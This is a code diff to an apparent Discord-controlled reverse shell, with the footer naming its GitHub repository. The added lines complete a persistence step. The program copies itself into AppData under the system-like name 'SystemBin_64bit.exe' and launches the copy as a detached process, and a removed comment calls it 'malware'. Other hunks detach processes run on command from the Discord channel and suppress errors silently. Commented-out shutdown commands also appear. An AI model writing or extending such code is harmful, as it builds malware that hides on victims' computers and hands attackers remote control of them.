@@ -47,15 +47,12 @@ def move():
         copyfile(file_dir, f"{target_dir}\SystemBin_64bit.exe")
 
         try:
-            #subprocess.Popen(f"{target_dir}\SystemBin_64bit.exe", shell=True)
-            #TODO       Run somehow the copied version of malware and make sure that they are running independently!
-            
+            os.chdir(target_dir)
+            subprocess.Popen(f"{target_dir}\SystemBin_64bit.exe", shell=True, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP)
             sys.exit()
-        except Exception as e:
-            print(e)
+        except:
             pass
-    except Exception as e:
-        print(e)
+    except:
         return
     
 if MOVE and file_dir[:1].upper() + file_dir[1:] != f"{os.getenv('appdata')}\MicrosoftWindows\System\SystemBin_64bit.exe":
@@ -323,7 +320,7 @@ async def on_message(message):
         except:
             await message.reply("Failed to upload the file!")
             return
-        embed = discord.Embed(title="Upload", description=f"```{os.getcwd()}{os.path.basename(link)}```", color=0xfafafa)
+        embed = discord.Embed(title="Upload", description=f"```{os.getcwd()}\{os.path.basename(link)}```", color=0xfafafa)
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed)
 
@@ -417,7 +414,7 @@ async def on_message(message):
         if file == "":
             message.reply("Please specify a file to run!")
         try:
-            output = subprocess.Popen(file, shell=True)
+            output = subprocess.Popen(file, shell=True, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP)
             embed = discord.Embed(title="Started", description=f"```{file}\n{output}```", color=0xfafafa)
         except:
             embed = discord.Embed(title="Error", description=f"```Failed to start: {file}```", color=0xfafafa)
@@ -540,4 +537,3 @@ except:
 #subprocess.run(["shutdown", "/s", "/t", "0"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
 #subprocess.run(["shutdown", "/r", "/t", "0"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-
